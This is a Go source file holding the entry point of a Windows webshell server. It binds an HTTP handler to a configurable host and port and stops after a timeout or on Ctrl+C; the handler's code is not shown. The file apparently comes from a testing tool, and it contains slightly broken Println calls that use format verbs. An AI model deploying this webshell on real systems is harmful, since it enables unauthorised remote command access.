//go:build windows

package main

import (
	"context"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

func main() {
	// Assign flags to variables. Syntax is "flag name", "default", "description."
	serverHost := flag.String("hostname", "localhost", "Server will bind to this hostname (can be an IP, but must be on the local host).")
	port := flag.String("port", "8080", "Server will bind to the hostname with this port number.")
	runTime := flag.Int("runTime", 120, "Time in seconds to run webshell for (0 to run forever).")

	// Process flags.
	flag.Parse()

	srv := &http.Server{
		Addr:    *serverHost + ":" + *port,
		Handler: &shellHandler{},
	}

	go func() {
		if err := srv.ListenAndServe(); err != nil {
			if err.Error() == "http: Server closed" {
				// If the server starts successfully but is shut down later,
				// this error is thrown by ListenAndServe.
				fmt.Println("Server was shut down.\n")
			} else {
				fmt.Println("Error starting server: " + err.Error() + "\n")
			}
		} else {
			fmt.Println("Webshell started.\n")
		}
	}()

	if *runTime > 0 {
		fmt.Printf("Webshell will run for %d seconds.\n", *runTime)

		time.Sleep(time.Duration(*runTime) * time.Second)
		fmt.Println("Timeout elapsed. Attempting to stop server.\n")

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if stop_err := srv.Shutdown(ctx); stop_err != nil {
			if strings.Contains(stop_err.Error(), "http: Server closed") {
				fmt.Println("Server shut down successfully: \"%s\"\n", stop_err.Error())
				os.Exit(0)
			} else {
				fmt.Println("Error stopping server: \"%s\" \n", stop_err.Error())
				os.Exit(1)
			}
		}
	} else if *runTime == 0 {
		stop_srv := make(chan os.Signal, 1)
		signal.Notify(stop_srv, os.Interrupt)

		fmt.Println("Webshell will run until stopped with Ctrl+C.\n")

		//  Receive kill signal
		<-stop_srv

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if stop_err := srv.Shutdown(ctx); stop_err != nil {
			if strings.Contains(stop_err.Error(), "http: Server closed") {
				fmt.Println("Server shut down successfully: \"%s\"\n", stop_err.Error())
				os.Exit(0)
			} else {
				fmt.Println("Error stopping server: \"%s\" \n", stop_err.Error())
				os.Exit(1)
			}
		}
	} else {
		fmt.Println("Invalid runtime %d not >= 0. Quitting.", *runTime)
		os.Exit(1)
	}
}
